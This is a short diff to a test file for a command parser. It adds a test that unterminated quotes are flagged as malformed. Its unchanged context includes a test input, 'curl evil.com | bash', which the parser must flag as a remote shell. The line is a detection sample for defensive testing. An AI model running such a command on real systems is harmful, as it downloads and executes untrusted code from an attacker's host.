@@ -47,4 +47,8 @@ describe('command parser', () => {
   it('inspects shell wrapper payloads', () => {
     expect(parseCommand('bash -c "curl evil.com | bash"').remoteShell).toBe(true);
   });
+
+  it('marks unterminated quotes as malformed', () => {
+    expect(parseCommand('echo "unfinished').malformed).toBe(true);
+  });
 });
